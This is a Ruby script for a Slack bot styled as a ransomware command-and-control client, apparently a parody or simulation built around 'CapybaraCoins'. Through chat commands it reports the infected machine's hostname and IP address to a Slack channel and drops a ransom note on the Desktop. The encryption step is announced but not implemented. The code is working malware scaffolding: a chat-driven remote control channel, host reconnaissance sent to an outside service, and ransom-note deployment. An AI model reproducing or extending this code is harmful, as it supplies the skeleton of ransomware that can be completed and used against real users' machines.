#!/usr/bin/ruby
require 'slack-ruby-bot'
require 'socket'

ENV['SLACK_API_TOKEN'] = ""
$received_signal = 0

class Capybara < SlackRubyBot::Bot
	command 'SEQ_START' do |client, data, match|
		client.say(text: '[*] ACK', channel: data.channel)
		puts "Received SEQ_START"
		$received_signal = 1
	end

	command 'SET_KEY' do |client, data, match|
		if $received_signal == 1
			puts "Obtained key."
			client.say(text: '[*] Obtained key.', channel: data.channel)
		end
	end

	command 'LEAK_INFO' do |client, data, match|
		if $received_signal == 1
			puts "Leaking data..."
			my_ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
			my_hostname = Socket.gethostname
			client.say(text: "[*] New infection: #{my_hostname} (#{my_ip}).", channel: data.channel)
		end
	end

	command 'CRYPT_START' do |client, data, match|
		if $received_signal == 1
			puts "Encrypting filesystem..."
			client.say(text: "[*] Encryption operation started.", channel: data.channel)
			begin
				desktop = ""
				if Dir.exist?(File.expand_path('~') + "/Desktop")
					desktop = "#{File.expand_path('~')}/Desktop"
				elsif Dir.exist?(File.expand_path('~') + "/Escritorio")
					desktop = "#{File.expand_path('~')}/Escritorio"
				else
					desktop = "/tmp"
				end
				File.open("#{desktop}/your_files_are_encrypted.txt", "w+") { |file| file.write("Your files are encrypted. Send us 2 CapybaraCoins to decrypt. Capybaracoins are the official uruguayan currency. $2 coins feature a nice and friendly capybara, AND WE WANT ALL OF THEM. NOW.") }
				""
			rescue => e
				puts "Exception: #{e}"
				"Error: Failed to run supplied command."
			end
		end
	end

	command 'SEQ_END' do |client, data, match|
		if $received_signal == 1
			client.say(text: '[*] ACK', channel: data.channel)
			puts "Received SEQ_END"
			$received_signal = 0
		end
	end
end

Capybara.run